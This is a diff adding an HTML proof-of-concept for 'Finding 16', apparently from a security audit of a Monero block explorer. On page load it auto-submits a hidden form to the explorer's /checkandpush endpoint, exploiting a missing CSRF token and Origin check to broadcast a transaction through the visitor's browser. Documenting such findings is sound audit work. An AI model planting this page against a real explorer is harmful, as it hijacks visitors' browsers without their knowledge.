@@ -1,0 +1,13 @@
+<!-- Finding 16 -- no CSRF token, no Origin check on POST /checkandpush.
+     Opening this page in a browser makes the visitor's browser broadcast the
+     supplied transaction through the explorer's daemon. Replace RAWTXDATA with a
+     base64 signed_monero_tx and EXPLORER with the target. -->
+<!doctype html><meta charset="utf-8"><title>CSRF PoC - finding 16</title>
+<p>Finding 16: this page submits a transaction through the explorer with no
+   interaction beyond loading it.</p>
+<form id="f" method="POST" action="EXPLORER/checkandpush" target="sink">
+  <input type="hidden" name="rawtxdata" value="RAWTXDATA">
+  <input type="hidden" name="action" value="push">
+</form>
+<iframe name="sink" style="display:none"></iframe>
+<script>document.getElementById('f').submit();</script>
